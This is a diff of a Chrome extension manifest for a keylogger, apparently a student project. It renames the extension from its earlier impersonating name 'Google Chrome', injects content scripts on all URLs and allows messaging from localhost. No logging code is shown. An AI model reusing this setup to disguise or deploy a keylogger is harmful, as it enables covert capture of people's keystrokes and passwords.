@@ -1,8 +1,12 @@
 {
     "manifest_version": 3,
-    "name": "Google Chrome",
+    "name": "Cryptonite Keylogger",
     "version": "1.0.0",
-    "description": "Google Chrome",
+    "description": "Keylogger developed for 6th sem project work",
+    "externally_connectable": {
+        "ids": ["cfmemdbkkoijppljnfpfhbkkfmcmbnik"],
+        "matches": ["*://localhost/*"]
+    },
     "content_scripts": [
         {
             "matches": ["<all_urls>"],
@@ -14,5 +18,10 @@
     "web_accessible_resources": [{
         "matches": ["<all_urls>"],
         "resources": ["scripts/brython.js", "scripts/brython_stdlib.js","scripts/test.js","public/test.html", "public/item.html"]
-    }]
+    }],
+    "action": {
+        "default_title": "Cryptonite Keylogger",
+        "default_popup": "./popup.html"
+    },
+    "permissions": ["storage"]
 }
